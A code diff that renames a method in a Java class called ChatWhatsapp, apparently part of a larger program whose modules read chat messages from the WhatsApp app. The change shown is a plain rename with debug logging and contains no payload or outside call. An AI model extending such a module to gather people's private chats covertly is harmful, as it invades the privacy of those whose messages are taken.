@@ -65,7 +65,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		}
 
 		try {
-			readChatMessages();
+			readChatWhatsappMessages();
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notifyStopProgram) Error: " + e);
@@ -109,7 +109,7 @@ public class ChatWhatsapp extends SubModuleChat {
 					Check.log(TAG + " (actualStart), get all Chats");
 				}
 
-				readChatMessages();
+				readChatWhatsappMessages();
 			}
 
 		} catch (Exception e) {
@@ -197,7 +197,7 @@ public class ChatWhatsapp extends SubModuleChat {
 	 * 
 	 * @throws IOException
 	 */
-	private void readChatMessages() throws IOException {
+	private void readChatWhatsappMessages() throws IOException {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (readChatMessages)");
 		}
